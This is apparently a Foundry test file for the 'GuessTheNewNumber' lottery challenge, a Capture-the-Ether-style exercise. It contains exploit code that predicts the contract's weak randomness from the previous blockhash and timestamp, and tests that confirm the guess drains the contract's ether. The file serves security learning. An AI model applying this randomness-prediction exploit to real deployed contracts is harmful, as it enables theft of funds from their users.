// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "source/lotteries/GuessTheNewNumber.sol";

contract GuessTheNewNumberTest is Test {

  GuessTheNewNumberChallenge guessTheNewNumberChallenge;

  address account1;
  address account2;
  uint8   answer;

  function setUp() public {
    account1 = vm.addr(1);
    vm.label(account1, "Account1[address]");
    vm.deal(account1, 10 ether);

    guessTheNewNumberChallenge = new GuessTheNewNumberChallenge{value: 1 ether}();
    vm.label(address(guessTheNewNumberChallenge), "GuessTheNewNumberChallenge[contract]");
    vm.startPrank(account1);
    //answer = crackRandom();

    // front run the target contract, get the solution then use it for the answer
    answer = crackTheNewRandomNumber();

    console.log(address(guessTheNewNumberChallenge));
    console.log(answer);
  }

  // Here we will calculate the random number using the same code as in the target contract
  function crackTheNewRandomNumber() public returns (uint8) {
    return uint8( uint256( keccak256( 
          abi.encodePacked(blockhash(block.number - 1), block.timestamp))
    ));
  }

  function testIncorrectGuess() public {
    // incorrect guess, costs 1 ether each
    guessTheNewNumberChallenge.guess{value: 1 ether}(1);
    guessTheNewNumberChallenge.guess{value: 1 ether}(43);

    uint expectedAccountBalance = 8 * (1 ether);
    assertEq((account1.balance), expectedAccountBalance );
    uint expectedContractBalance = 3 * (1 ether);
    assertEq(address(guessTheNewNumberChallenge).balance, expectedContractBalance );

    console.log(account1.balance);
    console.log(address(guessTheNewNumberChallenge).balance);
  }

  function testCorrectGuess() public {
    // correct guess, costs 1 ether, returns 2
    guessTheNewNumberChallenge.guess{value: 1 ether}(answer);

    uint expectedAccountBalance = 11 * (1 ether);
    assertEq((account1.balance), expectedAccountBalance );
    uint expectedContractBalance = 0;
    assertEq(address(guessTheNewNumberChallenge).balance, expectedContractBalance );

    console.log(answer);
    console.log(account1.balance);
    console.log(address(guessTheNewNumberChallenge).balance);
  }

  function testIsComplete() public {
    console.log(answer);

    guessTheNewNumberChallenge.guess{value: 1 ether}(answer);
    assertTrue(guessTheNewNumberChallenge.isComplete());

    console.log(account1.balance);
    console.log(address(guessTheNewNumberChallenge).balance);
  }

  fallback() external payable { }
  receive() external payable { }
}

